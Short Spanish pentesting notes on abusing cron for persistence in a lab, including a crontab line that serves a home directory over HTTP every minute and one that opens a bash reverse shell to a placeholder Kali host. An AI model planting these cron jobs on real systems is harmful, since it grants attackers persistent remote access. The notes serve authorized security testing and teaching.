Cron

Cron permite programar tareas periódicas y puede utilizarse como persistencia en laboratorio. En sistemas reales es una modificación sensible y debe limpiarse al terminar la prueba autorizada.

Comprobar si cron está activo

# Si Cron está corriendo podemos crear una tarea para ganar persistencia

# Comprobar
ps -eaf
# Si no está habilitado y tenemos permisos lo habilitamos
sudo systemctl start cron

# Podemos ver también las tareas cron en la ruta:
cat /etc/cron*

Bash target: Crear tarea cron

# Nos creamos un archivo para ejecutarlo como cron en el que cada minuto se dirige a ese directorio y abre un servidor python para poder acceder y leer lo que haya
echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron
# Crear la tarea
crontab cron
# Comprueba que se haya subido
crontab -l

# Para una reverse shell:
echo "* * * * * bash -i >& /dev/tcp/<ip_kali>/4444 0>&1" > cron
